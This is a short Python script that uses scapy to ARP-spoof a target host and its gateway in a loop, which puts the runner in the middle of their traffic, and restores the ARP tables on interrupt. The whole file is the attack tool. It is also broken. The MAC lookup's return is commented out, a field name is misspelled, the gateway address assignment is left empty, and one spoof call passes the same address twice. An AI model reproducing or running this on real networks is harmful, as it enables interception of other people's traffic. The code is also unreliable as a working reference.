# MrT3st3rs

import scapy.all as scapy
import time

def get_mac(ip):
    print('searching for ip: '+ip)
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    for i in answered_list:
        print(i[0].psrc)
        print(i[1].hwsrc)
    print(len(answered_list))
    # return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac= get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrsc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst= dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = ''
gateway_ip = 

# get_mac('10.0.2.5')
pack_counter = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, gateway_ip)
        pack_counter+=2
        print('\rSent packets!' + str(pack_counter), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("User interrupted with Ctr + C !")
    print('Restoring ARP table....')
    restore(target_ip, gateway_ip)
    restore(gateway_ip,target_ip)
    print('ARP tables has been reset!')

